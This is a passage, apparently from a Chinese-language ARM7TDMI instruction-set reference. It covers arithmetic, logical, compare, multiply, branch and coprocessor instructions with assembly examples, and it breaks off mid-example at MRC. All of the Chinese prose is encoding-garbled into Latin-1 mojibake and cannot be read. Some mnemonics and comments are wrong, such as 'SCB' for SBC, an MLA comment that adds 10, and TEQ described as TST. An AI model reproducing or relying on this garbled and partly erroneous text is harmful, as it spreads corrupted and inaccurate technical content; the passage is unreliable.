;ä½¿ç”¨ADC å®ç°64 ä½åŠ æ³•ï¼Œ(R1ã€R0)=(R1ã€R0)+ï¼ˆR3ã€R2ï¼‰\nSBC â€‹ å¸¦è¿›ä½å‡æ³•æŒ‡ä»¤ã€‚ç”¨å¯„å­˜å™¨Rn å‡å»operand2ï¼Œå†å‡å»CPSR ä¸­çš„Cæ¡ä»¶æ ‡å¿—ä½çš„éï¼ˆå³è‹¥C æ ‡å¿—æ¸…é›¶ï¼Œåˆ™ç»“æœå‡å»1ï¼‰ï¼Œç»“æœä¿å­˜åˆ°Rd ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  SCB{cond}{S}Rd,Rn,operand2 â€‹ SBC æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ SUBS R0ï¼ŒR0ï¼ŒR2 â€‹ SBC R1ï¼ŒR1ï¼ŒR3 ;ä½¿ç”¨SBC å®ç°64 ä½å‡æ³•ï¼Œ(R1,R0)-(R3,R2)\nRSC â€‹ å¸¦è¿›ä½é€†å‘å‡æ³•æŒ‡ä»¤ã€‚ç”¨å¯„å­˜å™¨operand2 å‡å»Rnï¼Œå†å‡å»CPSR ä¸­çš„Cæ¡ä»¶æ ‡å¿—ä½ï¼Œç»“æœä¿å­˜åˆ°Rd ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  RSC{cond}{S} Rd,Rn,operand2 â€‹ RSC æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ RSBS R2,R0,#0 â€‹ RSC R3,R1,#0 ;ä½¿ç”¨RSC æŒ‡ä»¤å®ç°æ±‚64 ä½æ•°å€¼çš„è´Ÿæ•°\nAND â€‹ é€»è¾‘ä¸æ“ä½œæŒ‡ä»¤ã€‚å°†operand2 å€¼ä¸å¯„å­˜å™¨Rn çš„å€¼æŒ‰ä½ä½œé€»è¾‘ä¸æ“ä½œï¼Œç»“æœä¿å­˜åˆ°Rdä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ AND{cond}{S} Rd,Rn,operand2 â€‹ AND æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ ANDS R0,R0,#x01 ;R0=R0\u00260x01ï¼Œå–å‡ºæœ€ä½ä½æ•°æ® â€‹ AND R2,R1,R3 ;R2=R1\u0026R3\nORR â€‹ é€»è¾‘æˆ–æ“ä½œæŒ‡ä»¤ã€‚å°†operand2 çš„å€¼ä¸å¯„å­˜å™¨Rnçš„å€¼æŒ‰ä½ä½œé€»è¾‘æˆ–æ“ä½œï¼Œç»“æœä¿å­˜åˆ°Rd ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ ORR{cond}{S} Rd,Rn,operand2 â€‹ ORR æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ ORR R0,R0,#x0F ;å°†R0 çš„ä½4 ä½ç½®1 â€‹ MOV R1,R2,LSR #4 â€‹ ORR R3,R1,R3,LSL #8 ;ä½¿ç”¨ORR æŒ‡ä»¤å°†è¿‘R2 çš„é«˜8ä½æ•°æ®ç§»å…¥åˆ°R3 ä½8 ä½ä¸­\nEOR â€‹ é€»è¾‘å¼‚æˆ–æ“ä½œæŒ‡ä»¤ã€‚å°†operand2 çš„å€¼ä¸å¯„å­˜å™¨Rn çš„å€¼æŒ‰ä½ä½œé€»è¾‘å¼‚æˆ–æ“ä½œï¼Œç»“æœä¿å­˜åˆ°Rdä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ EOR{cond}{S}Rd,Rn,operand2 â€‹ EOR æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ EOR R1,R1,#0x0F ;å°†R1 çš„ä½4 ä½å–å â€‹ EOR R2,R1,R0 ;R2=R1^R0 â€‹ EORS R0,R5,#0x01 ;å°†R5 å’Œ0x01 è¿›è¡Œé€»è¾‘å¼‚æˆ–ï¼Œç»“æœä¿å­˜åˆ°R0ï¼Œå¹¶å½±å“æ ‡å¿—ä½\nBIC â€‹ ä½æ¸…é™¤æŒ‡ä»¤ã€‚å°†å¯„å­˜å™¨Rn çš„å€¼ä¸operand2 çš„å€¼çš„åç æŒ‰ä½ä½œé€»è¾‘ä¸æ“ä½œï¼Œç»“æœä¿å­˜åˆ°Rdä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ BIC{cond}{S}Rd,Rn,operand2 â€‹ BIC æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ BIC R1,R1,#0x0F ;å°†R1 çš„ä½4 ä½æ¸…é›¶ï¼Œå…¶å®ƒä½ä¸å˜ â€‹ BIC R1,R2,R3 ;å°†æ‹­çš„åç å’ŒR2 ç›¸é€»è¾‘ä¸ï¼Œç»“æœä¿å­˜åˆ°R1\nâ€‹ ï¼ˆ3ï¼‰æ¯”è¾ƒæŒ‡ä»¤\nCMP â€‹ æ¯”è¾ƒæŒ‡ä»¤ã€‚æŒ‡ä»¤ä½¿ç”¨å¯„å­˜å™¨Rn çš„å€¼å‡å»operand2 çš„å€¼ï¼Œæ ¹æ®æ“ä½œçš„ç»“æœæ›´æ–°CPSRä¸­çš„ç›¸åº”æ¡ä»¶æ ‡å¿—ä½ï¼Œä»¥ä¾¿åé¢çš„æŒ‡ä»¤æ ¹æ®ç›¸åº”çš„æ¡ä»¶æ ‡å¿—æ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡Œã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ CMP{cond} Rn,operand2 â€‹ CMP æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ CMP R1,#10 ;R1 ä¸10 æ¯”è¾ƒï¼Œè®¾ç½®ç›¸å…³æ ‡å¿—ä½ â€‹ CMP R1,R2 ;R1 ä¸R2 æ¯”è¾ƒï¼Œè®¾ç½®ç›¸å…³æ ‡å¿—ä½ â€‹ CMP æŒ‡ä»¤ä¸SUBS æŒ‡ä»¤çš„åŒºåˆ«åœ¨äºCMP æŒ‡ä»¤ä¸ä¿å­˜è¿ç®—ç»“æœã€‚åœ¨è¿›è¡Œä¸¤ä¸ªæ•°æ®å¤§å°åˆ¤æ–­æ—¶ï¼Œå¸¸ç”¨CMPæŒ‡ä»¤åŠç›¸åº”çš„æ¡ä»¶ç æ¥æ“ä½œã€‚\nCMN â€‹ è´Ÿæ•°æ¯”è¾ƒæŒ‡ä»¤ã€‚æŒ‡ä»¤ä½¿ç”¨å¯„å­˜å™¨Rn ä¸å€¼åŠ ä¸Šoperand2 çš„å€¼ï¼Œæ ¹æ®æ“ä½œçš„ç»“æœæ›´æ–°CPSRä¸­çš„ç›¸åº”æ¡ä»¶æ ‡å¿—ä½ï¼Œä»¥ä¾¿åé¢çš„æŒ‡ä»¤æ ¹æ®ç›¸åº”çš„æ¡ä»¶æ ‡å¿—æ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡Œï¼ŒæŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ CMN{cond} Rn,operand2 â€‹ CMN R0,#1 ;R0+1,åˆ¤æ–­R0 æ˜¯å¦ä¸º1 çš„è¡¥ç ï¼Œè‹¥æ˜¯Z ç½®ä½ â€‹ CMN æŒ‡ä»¤ä¸ADDS æŒ‡ä»¤çš„åŒºåˆ«åœ¨äºCMN æŒ‡ä»¤ä¸ä¿å­˜è¿ç®—ç»“æœã€‚CMNæŒ‡ä»¤å¯ç”¨äºè´Ÿæ•°æ¯”è¾ƒï¼Œæ¯”å¦‚CMNR0ï¼Œ#1 æŒ‡ä»¤åˆ™è¡¨ç¤ºR0 ä¸-1 æ¯”è¾ƒï¼Œè‹¥R0 ä¸º-(å³1 çš„è¡¥ç )ï¼Œåˆ™Z ç½®ä½ï¼Œå¦åˆ™Zå¤ä½ã€‚\nTST â€‹ ä½æµ‹è¯•æŒ‡ä»¤ã€‚æŒ‡ä»¤å°†å¯„å­˜å™¨Rn çš„å€¼ä¸operand2 çš„å€¼æŒ‰ä½ä½œé€»è¾‘ä¸æ“ä½œï¼Œæ ¹æ®æ“ä½œçš„ç»“æœæ›´æ–°CPSRä¸­ç›¸åº”çš„æ¡ä»¶æ ‡å¿—ä½(å½“ç»“æœä¸º0æ—¶ï¼ŒEQä½è¢«è®¾ç½®)ï¼Œä»¥ä¾¿åé¢æŒ‡ä»¤æ ¹æ®ç›¸åº”çš„æ¡ä»¶æ ‡å¿—æ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡Œã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ TST{cond} Rn,operand2 â€‹ TST æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ TST R0,#0x01 ;åˆ¤æ–­R0 çš„æœ€ä½ä½æ˜¯å¦ä¸º0 â€‹ TST R1,#0x0F ;åˆ¤æ–­R1 çš„ä½4 ä½æ˜¯å¦ä¸º0 â€‹ TST æŒ‡ä»¤ä¸ANDS æŒ‡ä»¤çš„åŒºåˆ«åœ¨äºTST4 æŒ‡ä»¤ä¸ä¿å­˜è¿ç®—ç»“æœã€‚TSTæŒ‡ä»¤é€šå¸¸äºEQã€NEæ¡ä»¶ç é…åˆä½¿ç”¨ï¼Œå½“æ‰€æœ‰æµ‹è¯•ä½å‡ä¸º0 æ—¶ï¼ŒEQ æœ‰æ•ˆï¼Œè€Œåªè¦æœ‰ä¸€ä¸ªæµ‹è¯•ä¸ºä¸ä¸º0ï¼Œåˆ™NE æœ‰æ•ˆã€‚\nTEQ â€‹ ç›¸ç­‰æµ‹è¯•æŒ‡ä»¤ã€‚æŒ‡ä»¤å¯„å­˜å™¨Rn çš„å€¼ä¸operand2 çš„å€¼æŒ‰ä½ä½œé€»è¾‘å¼‚æˆ–æ“ä½œï¼Œæ ¹æ®æ“ä½œçš„ç»“æœæ›´æ–°CPSRä¸­ç›¸åº”æ¡ä»¶æ ‡å¿—ä½ï¼Œä»¥ä¾¿åé¢çš„æŒ‡ä»¤æ ¹æ®ç›¸åº”çš„æ¡ä»¶æ ‡å¿—æ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡Œã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ TEQ{cond} Rn,operand2 â€‹ TEQ æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ TEQ R0,R1 ;æ¯”è¾ƒR0 ä¸R1 æ˜¯å¦ç›¸ç­‰(ä¸å½±å“V ä½å’ŒC ä½) â€‹ TST æŒ‡ä»¤ä¸EORS æŒ‡ä»¤çš„åŒºåˆ«åœ¨äºTST æŒ‡ä»¤ä¸ä¿å­˜è¿ç®—ç»“æœã€‚ä½¿ç”¨TEQè¿›è¡Œç›¸ç­‰æµ‹è¯•ï¼Œå¸¸ä¸EQNE æ¡ä»¶ç é…åˆä½¿ç”¨ï¼Œå½“ä¸¤ä¸ªæ•°æ®ç›¸ç­‰æ—¶ï¼ŒEQ æœ‰æ•ˆï¼Œå¦åˆ™NE æœ‰æ•ˆã€‚\nï¼ˆ4ï¼‰ä¹˜æ³•æŒ‡ä»¤ â€‹ ARM7TDMI(-S)å…·æœ‰32Ã—32 ä¹˜æ³•æŒ‡ä»¤ã€32Ã—32 ä¹˜åŠ æŒ‡ä»¤ã€32Ã—32ç»“æœä¸º64 ä½çš„ä¹˜æ³•æŒ‡ä»¤ã€‚è¡¨A-5ç»™å‡ºå…¨éƒ¨çš„ARM ä¹˜æ³•æŒ‡ä»¤ã€‚\nè¡¨A-5 å…¨éƒ¨çš„ARM ä¹˜æ³•æŒ‡ä»¤\nMUL 32 ä½ä¹˜æ³•æŒ‡ä»¤ã€‚æŒ‡ä»¤å°†Rm å’ŒRs ä¸­çš„å€¼ç›¸ä¹˜ï¼Œç»“æœçš„ä½32 ä½ä¿å­˜åˆ°Rdä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š MUL{cond}{S} Rd,Rm,Rs MUL æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š MUL R1,R2,R3 ;R1=R2Ã—R3 MULS R0,R3,R7 ;R0=R3Ã—R7ï¼ŒåŒæ—¶è®¾ç½®CPSR ä¸­çš„Nä½å’ŒZ ä½ MLA â€‹ 32 ä½ä¹˜åŠ æŒ‡ä»¤ã€‚æŒ‡ä»¤å°†Rm å’ŒRs ä¸­çš„å€¼ç›¸ä¹˜ï¼Œå†å°†ä¹˜ç§¯åŠ ä¸Šç¬¬3 ä¸ªæ“ä½œæ•°ï¼Œç»“æœçš„ä½32ä½ä¿å­˜åˆ°Rd ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ MLA{cond}{S} Rd,Rm,Rs,Rn â€‹ MLA æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ MLA R1,R2,R3,R0 ;R1=R2Ã—R3+10\nUMULL â€‹ 64 ä½æ— ç¬¦å·ä¹˜æ³•æŒ‡ä»¤ã€‚æŒ‡ä»¤å°†Rm å’ŒRs ä¸­çš„å€¼ä½œæ— ç¬¦å·æ•°ç›¸ä¹˜ï¼Œç»“æœçš„ä½32ä½ä¿å­˜åˆ°RsLo ä¸­ï¼Œè€Œé«˜32 ä½ä¿å­˜åˆ°RdHi ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ UMULL{cond}{S} RdLo,RdHi,Rm,Rs â€‹ UMULL æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ UMULL R0,R1,R5,R8 ;(R1ã€R0)=R5Ã—R8\nUMLAL â€‹ 64 ä½æ— ç¬¦å·ä¹˜åŠ æŒ‡ä»¤ã€‚æŒ‡ä»¤å°†Rm å’ŒRs ä¸­çš„å€¼ä½œæ— ç¬¦å·æ•°ç›¸ä¹˜ï¼Œ64 ä½ä¹˜ç§¯ä¸RdHiã€RdLoç›¸åŠ ï¼Œç»“æœçš„ä½32 ä½ä¿å­˜åˆ°RdLo ä¸­ï¼Œè€Œé«˜32 ä½ä¿å­˜åˆ°RdHi ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ UMLAL{cond}{S} RdLo,RdHi,Rm,Rs â€‹ UMLAL æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ UMLAL R0,R1,R5,R8;(R1,R0)=R5Ã—R8+(R1,R0)\nSMULL â€‹ 64 ä½æœ‰ç¬¦å·ä¹˜æ³•æŒ‡ä»¤ã€‚æŒ‡ä»¤å°†Rm å’ŒRs ä¸­çš„å€¼ä½œæœ‰ç¬¦å·æ•°ç›¸ä¹˜ï¼Œç»“æœçš„ä½32ä½ä¿å­˜åˆ°RdLo ä¸­ï¼Œè€Œé«˜32 ä½ä¿å­˜åˆ°RdHi ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  SMULL{cond}{S} RdLo,RdHi,Rm,Rs â€‹ SMULL æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ SMULL R2,R3,R7,R6 ;(R3,R2)=R7Ã—R6\nSMLAL â€‹ 64 ä½æœ‰ç¬¦å·ä¹˜åŠ æŒ‡ä»¤ã€‚æŒ‡ä»¤å°†Rm å’ŒRs ä¸­çš„å€¼ä½œæœ‰ç¬¦å·æ•°ç›¸ä¹˜ï¼Œ64 ä½ä¹˜ç§¯ä¸RdHiã€RdLoï¼Œç›¸åŠ ï¼Œç»“æœçš„ä½32ä½ä¿å­˜åˆ°RdLo ä¸­ï¼Œè€Œé«˜32 ä½ä¿å­˜åˆ°RdHi ä¸­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  SMLAL{cond}{S} RdLo,RdHi,Rm,Rs â€‹ SMLAL æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ SMLAL R2,R3,R7,R6;(R3,R2)=R7Ã—R6+(R3,R2)\n1.3.3. ARM è·³è½¬æŒ‡ä»¤ â€‹ ä¸¤ç§æ–¹å¼å¯ä»¥å®ç°ç¨‹åºçš„è·³è½¬ï¼š\nï¼ˆ1ï¼‰ ä½¿ç”¨è·³è½¬æŒ‡ä»¤ç›´æ¥è·³è½¬ï¼Œè·³è½¬æŒ‡ä»¤æœ‰è·³è½¬æŒ‡ä»¤Bï¼Œå¸¦é“¾æ¥çš„è·³è½¬æŒ‡ä»¤BL ï¼Œå¸¦çŠ¶æ€åˆ‡æ¢çš„è·³è½¬æŒ‡ä»¤BXã€‚\nï¼ˆ2ï¼‰ ç›´æ¥å‘PC å¯„å­˜å™¨èµ‹å€¼å®ç°è·³è½¬ã€‚\nè¡¨A-6ç»™å‡ºå…¨éƒ¨çš„ARMè·³è½¬æŒ‡ä»¤ã€‚\nè¡¨A-6 ARMè·³è½¬æŒ‡ä»¤\nB â€‹\tè·³è½¬æŒ‡ä»¤ï¼Œè·³è½¬åˆ°æŒ‡å®šçš„åœ°å€æ‰§è¡Œç¨‹åºã€‚\n `B{cond} label` ä¸¾ä¾‹å¦‚ä¸‹ï¼š  â€‹ B WAITA ;è·³è½¬åˆ°WAITA æ ‡å·å¤„\nâ€‹ B 0x1234 ;è·³è½¬åˆ°ç»å¯¹åœ°å€0x1234 å¤„\nâ€‹ è·³è½¬åˆ°æŒ‡ä»¤B é™åˆ¶åœ¨å½“å‰æŒ‡ä»¤çš„Â±32Mb çš„èŒƒå›´å†…ã€‚\nBL å¸¦é“¾æ¥çš„è·³è½¬æŒ‡ä»¤ã€‚æŒ‡ä»¤å°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ‹·è´åˆ°R14(å³LR)é“¾æ¥å¯„å­˜å™¨ä¸­ï¼Œç„¶åè·³è½¬åˆ°æŒ‡å®šåœ°å€è¿è¡Œç¨‹åºã€‚\nâ€‹ BL{cond} label\nâ€‹ ä¸¾ä¾‹å¦‚ä¸‹ï¼š\nâ€‹ BL DELAY\nâ€‹ è·³è½¬æŒ‡ä»¤B é™åˆ¶åœ¨å½“å‰æŒ‡ä»¤çš„Â±32MB çš„èŒƒå›´å†…ã€‚BL æŒ‡ä»¤ç”¨äºå­ç¨‹åºè°ƒç”¨ã€‚\nBX å¸¦çŠ¶æ€åˆ‡æ¢çš„è·³è½¬æŒ‡ä»¤ã€‚è·³è½¬åˆ°Rm æŒ‡å®šçš„åœ°å€æ‰§è¡Œç¨‹åºï¼Œè‹¥Rm çš„ä½[0]ä¸º1ï¼Œåˆ™è·³è½¬æ—¶è‡ªåŠ¨å°†CPSR ä¸­çš„æ ‡å¿—T ç½®ä½ï¼Œå³æŠŠç›®æ ‡åœ°å€çš„ä»£ç è§£é‡Šä¸ºThumbä»£ç ;è‹¥Rm çš„ä½[0]ä¸º0ï¼Œåˆ™è·³è½¬æ—¶è‡ªåŠ¨å°†CPSR ä¸­çš„æ ‡å¿—T å¤ä½ï¼Œå³æŠŠç›®æ ‡åœ°å€çš„ä»£ç è§£é‡Šä¸ºARMä»£ç ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ BX{cond} Rm â€‹ ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ ADRL R0,ThumbFun+1 â€‹ BX R0 ;è·³è½¬åˆ°R0 æŒ‡å®šçš„åœ°å€ï¼Œå¹¶æ ¹æ®R0 çš„æœ€ä½ä½æ¥åˆ‡æ¢å¤„ç†å™¨çŠ¶æ€\nBLX â€‹ BLXç›®æ ‡åœ°å€ï¼šè·³è½¬ï¼Œæ”¹å˜çŠ¶æ€åŠä¿å­˜PCå€¼\n1.3.4. ARM åå¤„ç†å™¨æŒ‡ä»¤ 5 ARM æ”¯æŒåå¤„ç†å™¨æ“ä½œï¼Œåå¤„ç†å™¨çš„æ§åˆ¶è¦é€šè¿‡åå¤„ç†å™¨å‘½ä»¤å®ç°ã€‚è¡¨A-7ç»™å‡ºå…¨éƒ¨çš„ARMåå¤„ç†å™¨æŒ‡ä»¤ã€‚\nè¡¨A-7 ARM åå¤„ç†å™¨æŒ‡ä»¤\nCDP â€‹ åå¤„ç†å™¨æ•°æ®æ“ä½œæŒ‡ä»¤ã€‚ARM å¤„ç†å™¨é€šè¿‡CDP æŒ‡ä»¤é€šçŸ¥ARM åå¤„ç†å™¨æ‰§è¡Œç‰¹å®šçš„æ“ä½œã€‚è¯¥æ“ä½œç”±åå¤„ç†å™¨å®Œæˆï¼Œå³å¯¹å‘½ä»¤çš„å‚æ•°çš„è§£é‡Šä¸åå¤„ç†å™¨æœ‰å…³ï¼ŒæŒ‡ä»¤çš„ä½¿ç”¨å–å†³äºåå¤„ç†å™¨ã€‚è‹¥åå¤„ç†å™¨ä¸èƒ½æˆåŠŸåœ°æ‰§è¡Œè¯¥æ“ä½œï¼Œå°†äº§ç”Ÿæœªå®šä¹‰æŒ‡ä»¤å¼‚å¸¸ä¸­æ–­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2} â€‹ å…¶ä¸­ï¼š coproc æŒ‡ä»¤æ“ä½œçš„åå¤„ç†å™¨åã€‚æ ‡å‡†åä¸ºpn,n ä¸º0ï½15ã€‚ â€‹ opcodel åå¤„ç†å™¨çš„ç‰¹å®šæ“ä½œç ã€‚ â€‹ CRd ä½œä¸ºç›®æ ‡å¯„å­˜å™¨çš„åå¤„ç†å™¨å¯„å­˜å™¨ã€‚ â€‹ CRN å­˜æ”¾ç¬¬1 ä¸ªæ“ä½œæ•°çš„åå¤„ç†å™¨å¯„å­˜å™¨ã€‚ â€‹ CRm å­˜æ”¾ç¬¬2 ä¸ªæ“ä½œæ•°çš„åå¤„ç†å™¨å¯„å­˜å™¨ã€‚ â€‹ Opcode2 å¯é€‰çš„åå¤„ç†å™¨ç‰¹å®šæ“ä½œç ã€‚ â€‹ CDP æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ CDP p7,0,c0,c2,c3,0 ;åå¤„ç†å™¨7 æ“ä½œï¼Œæ“ä½œç ä¸º0ï¼Œå¯é€‰æ“ä½œç ä¸º0 â€‹ CDP p6,1,c3,c4,c5 ;åå¤„ç†å™¨æ“ä½œï¼Œæ“ä½œç ä¸º1\nLDC â€‹ åå¤„ç†å™¨æ•°æ®è¯»å–æŒ‡ä»¤ã€‚LDCæŒ‡ä»¤ä»æŸä¸€è¿ç»­çš„å†…å­˜å•å…ƒå°†æ•°æ®è¯»å–åˆ°åå¤„ç†å™¨çš„å¯„å­˜å™¨ä¸­ã€‚åå¤„ç†å™¨æ•°æ®çš„æ•°æ®çš„ä¼ é€ï¼Œç”±åå¤„ç†å™¨æ¥æ§ä¼ é€çš„å­—æ•°ã€‚è‹¥åå¤„ç†å™¨ä¸èƒ½æˆåŠŸåœ°æ‰§è¡Œè¯¥æ“ä½œï¼Œå°†äº§ç”Ÿæœªå®šä¹‰æŒ‡ä»¤å¼‚å¸¸ä¸­æ–­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ LDC{cond}{L} coproc,CRd,\u003cåœ°å€\u003e â€‹ å…¶ä¸­ï¼š L å¯é€‰åç¼€ï¼ŒæŒ‡æ˜æ˜¯é•¿æ•´æ•°ä¼ é€ã€‚ â€‹ coproc æŒ‡ä»¤æ“ä½œçš„åå¤„ç†å™¨åã€‚æ ‡å‡†åä¸ºpnï¼Œn ä¸º0ï½15 â€‹ CRd ä½œä¸ºç›®æ ‡å¯„å­˜çš„åå¤„ç†å™¨å¯„å­˜å™¨ã€‚ â€‹ \u003cåœ°å€\u003e æŒ‡å®šçš„å†…å­˜åœ°å€ â€‹ LDC æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ LDC p5,c2,[R2,#4];è¯»å–R2+4æŒ‡å‘çš„å†…å­˜å•å…ƒçš„æ•°æ®ï¼Œä¼ é€åˆ°åå¤„ç†å™¨p5çš„c2å¯„å­˜å™¨ä¸­ â€‹  LDC p6,c2,[R1] ;è¯»å–æ˜¯æŒ‡å‘çš„å†…å­˜å•å…ƒçš„æ•°æ®ï¼Œä¼ é€åˆ°åå¤„ç†å™¨p6çš„c2 å¯„å­˜å™¨ä¸­\nSTC â€‹ åå¤„ç†å™¨æ•°æ®å†™å…¥æŒ‡ä»¤ã€‚STCæŒ‡ä»¤å°†åå¤„ç†å™¨çš„å¯„å­˜å™¨æ•°æ®å†™å…¥åˆ°æŸä¸€è¿ç»­çš„å†…å­˜å•å…ƒä¸­ã€‚è¿›è¡Œåå¤„ç†å™¨æ•°æ®çš„æ•°æ®ä¼ é€ï¼Œç”±åå¤„ç†å™¨æ¥æ§åˆ¶ä¼ é€çš„å­—æ•°ã€‚è‹¥åå¤„ç†å™¨ä¸èƒ½æˆåŠŸåœ°æ‰§è¡Œè¯¥æ“ä½œï¼Œå°†äº§ç”Ÿæœªå®šä¹‰æŒ‡ä»¤å¼‚å¸¸ä¸­æ–­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  STC{cond}{L} coproc,CRd,\u003cåœ°å€\u003e â€‹ å…¶ä¸­ï¼š L å¯é€‰åç¼€ï¼ŒæŒ‡æ˜æ˜¯é•¿æ•´æ•°ä¼ é€ã€‚ â€‹ coproc æŒ‡ä»¤æ“ä½œçš„åå¤„ç†å™¨åã€‚æ ‡å‡†åä¸ºpnï¼Œn ä¸º0ï½15 â€‹ CRd ä½œä¸ºç›®æ ‡å¯„å­˜çš„åå¤„ç†å™¨å¯„å­˜å™¨ã€‚ â€‹ \u003cåœ°å€\u003e æŒ‡å®šçš„å†…å­˜åœ°å€ â€‹ STC æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ STC p5,c1,[R0] â€‹ STC p5,c1,[Ro,#-0x04]\nMCR â€‹ ARMå¯„å­˜å™¨åˆ°åå¤„ç†å™¨å¯„å­˜å™¨çš„æ•°æ®ä¼ é€æŒ‡ä»¤ã€‚MCR æŒ‡ä»¤å°†ARM å¤„ç†å™¨çš„å¯„å­˜å™¨ä¸­çš„æ•°æ®ä¼ é€åˆ°åå¤„ç†å™¨çš„å¯„å­˜å™¨ä¸­ã€‚è‹¥åå¤„ç†å™¨ä¸èƒ½æˆåŠŸåœ°æ‰§è¡Œè¯¥æ“ä½œï¼Œå°†äº§ç”Ÿæœªå®šä¹‰æŒ‡ä»¤å¼‚å¸¸ä¸­æ–­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹  MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2} â€‹ å…¶ä¸­ï¼šcoproc æŒ‡ä»¤æ“ä½œçš„åå¤„ç†å™¨åã€‚æ ‡å‡†åä¸ºpnï¼Œn ä¸º0ï½15ã€‚ â€‹ cpcodel åå¤„ç†å™¨çš„ç‰¹å®šæ“ä½œç ã€‚ â€‹ RD ä½œä¸ºç›®æ ‡å¯„å­˜å™¨ã€‚ â€‹ CRn å­˜æ”¾ç¬¬1 ä¸ªæ“ä½œæ•°çš„åå¤„ç†å™¨å¯„å­˜å™¨ â€‹ CRm å­˜æ”¾ç¬¬2 ä¸ªæ“ä½œæ•°çš„åå¤„ç†å™¨å¯„å­˜å™¨ã€‚ â€‹ Opcode2 å¯é€‰çš„åå¤„ç†å™¨ç‰¹å®šæ“ä½œç ã€‚ â€‹ MCR æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ MCR p6,2,R7,c1,c2, â€‹ MCR P7,0,R1,c3,c2,1,\nMRC â€‹ åå¤„ç†å™¨å¯„å­˜å™¨åˆ°ARMå¯„å­˜å™¨åˆ°çš„æ•°æ®ä¼ é€æŒ‡ä»¤ã€‚MRC æŒ‡ä»¤å°†åå¤„ç†å™¨å¯„å­˜å™¨ä¸­çš„æ•°æ®ä¼ é€åˆ°ARM å¤„ç†å™¨çš„å¯„å­˜å™¨ä¸­ã€‚è‹¥åå¤„ç†å™¨ä¸èƒ½æˆåŠŸåœ°æ‰§è¡Œè¯¥æ“ä½œã€‚å°†äº§ç”Ÿæœªå®šä¹‰å¼‚å¸¸ä¸­æ–­ã€‚æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š â€‹ MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2} â€‹ å…¶ä¸­ï¼šcoproc æŒ‡ä»¤æ“ä½œçš„åå¤„ç†å™¨åã€‚æ ‡å‡†åä¸ºpnï¼Œnä¸º0ï½15ã€‚ â€‹ opcodel åå¤„ç†å™¨çš„ç‰¹å®šæ“ä½œç ã€‚ â€‹ Rd ä½œä¸ºç›®æ ‡å¯„å­˜å™¨ã€‚ â€‹ CRn å­˜æ”¾ç¬¬1 ä¸ªæ“ä½œæ•°çš„åå¤„ç†å™¨å¯„å­˜å™¨ã€‚ â€‹ CRm å­˜æ”¾ç¬¬2 ä¸ªæ“ä½œæ•°çš„åå¤„ç†å™¨å¯„å­˜å™¨ã€‚ â€‹ opcode2 å¯é€‰çš„åå¤„ç†å™¨ç‰¹å®šæ“ä½œç ã€‚ â€‹ MRC æŒ‡ä»¤ä¸¾ä¾‹å¦‚ä¸‹ï¼š â€‹ MRC p5,2,R2,c3,c2 â€‹ MRC 